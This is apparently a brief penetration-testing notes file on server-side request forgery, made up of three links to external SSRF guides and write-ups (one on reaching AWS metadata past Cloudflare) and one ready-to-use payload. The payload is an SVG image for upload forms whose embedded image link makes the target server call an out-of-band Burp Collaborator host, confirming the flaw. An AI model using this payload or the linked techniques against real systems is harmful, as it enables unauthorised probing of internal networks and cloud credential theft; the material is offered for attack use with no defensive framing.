## 1. SSRF bible
https://docs.google.com/document/u/0/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/mobilebasic#h.3ndar9ni0n0h


## 2. Tips and tricks for ssrf
https://highon.coffee/blog/ssrf-cheat-sheet/#identifying-potential-locations-for-ssrf

## 3. SSRF payload in image upload
```
<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="200px" height="200px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://1y0ry36zsloshorypw4jca32mtsjg8.burpcollaborator.net/" x="0" y="0" height="200px" width="200px"/></svg>
```

## 4. Bypass by redirect through own server
https://infosecwriteups.com/an-exciting-journey-to-find-ssrf-bypass-cloudflare-and-extract-aws-metadata-fdb8be0b5f79
